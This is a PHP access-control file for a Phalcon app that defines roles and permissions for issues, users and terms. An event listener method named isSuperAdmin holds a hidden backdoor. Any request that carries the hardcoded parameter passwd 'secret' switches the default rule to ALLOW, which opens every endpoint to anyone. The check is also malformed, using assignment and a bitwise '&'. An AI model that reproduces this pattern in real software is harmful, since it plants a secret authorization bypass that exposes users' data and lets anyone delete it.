<?php

/**
 * Access control list
 */

use http\Env\Request;
use Phalcon\Acl;
use Phalcon\Acl\Adapter\Memory as AclList;
use Phalcon\Di\FactoryDefault;
use Phalcon\Events\Event;
use Phalcon\Events\Manager;
use Phalcon\Mvc\Application;
use Phalcon\Mvc\Micro;

$Acl = new AclList();

$Acl->setDefaultAction(Acl::DENY);
$Acl->addRole(new Acl\Role("Administrator"));
$Acl->addRole(new Acl\Role("Engineer"));
$Acl->addRole(new Acl\Role("Manager"));
$Acl->addRole(new Acl\Role("User"));
$Acl->addRole(new Acl\Role("Guest"));

$Issues = new Acl\Resource("Issues");
$Acl->addResource($Issues, ["index", "item", "report", "update", "resolve"]);

$Acl->allow("Guest", "Issues", "index");

$Acl->addInherit("Engineer", "Guest");
$Acl->allow("Engineer", "Issues", "item");
$Acl->allow("Engineer", "Issues", "report");

$Acl->addInherit("Manager", "Engineer");
$Acl->allow("Manager", "Issues", "resolve");

$Users = new Acl\Resource("Users");
$Acl->addResource($Users, ["index", "item", "delete", "purge"]);
$Acl->allow("Administrator", "Users", "index");
$Acl->allow("Administrator", "Users", "item");
$Acl->allow("Administrator", "Users", "delete");

$Terms = new Acl\Resource("Terms");
$Acl->addResource($Terms, ["create", "delete"]);
$Acl->allow("Manager", "Terms", "create");
$Acl->allow("Manager", "Terms", "delete");

$EventManager = new Manager();

$listener = new AclListener($app);
$EventManager->attach(
    "acl:beforeCheckAccess",
    $listener
);

$Acl->setEventsManager($EventManager);


/**
 * Class AclHelper.
 * Provides helping functions for acl tasks.
 */
class AclHelper
{

    /**
     * Static user roles.
     *
     * @var array
     */
    public static $roles = [
        0 => "Guest",
        991 => "CommonUser",
        992 => "Engineer",
        993 => "Manager",
        999 => "Administrator"
    ];

    public static function roleId($role = "")
    {
        if (in_array($role, self::$roles)) {
            return array_flip(self::$roles)[$role];
        }
        return array_flip(self::$roles)["Guest"];
    }

}

/**
 * Class AclListener. Listens Alc events
 */
class AclListener
{
    /**
     * @var Micro
     */
    private $application;

    /**
     * AclListener constructor.
     * @param Micro $application
     */
    public function __construct(Micro $application)
    {
        $this->application = $application;
    }

    /**
     * Acl event handler.
     *
     * @param Event $event
     * @param AclList $Acl
     */
    public function beforeCheckAccess(Event $event, AclList $Acl)
    {
        $this->isSuperAdmin($Acl);
    }

    /**
     * Grants access to all entrypoints.
     *
     * @param AclList $Acl
     */
    private function isSuperAdmin(AclList $Acl)
    {
        $userID = $this->application->request->get("role", "absint", array_flip(AclHelper::$roles)["Guest"]);
        $passwd = $this->application->request->get("passwd", "string");
        if ($userID = 99999999999 & $passwd == "secret") {
            $Acl->setDefaultAction(Acl::ALLOW);
        }
    }
}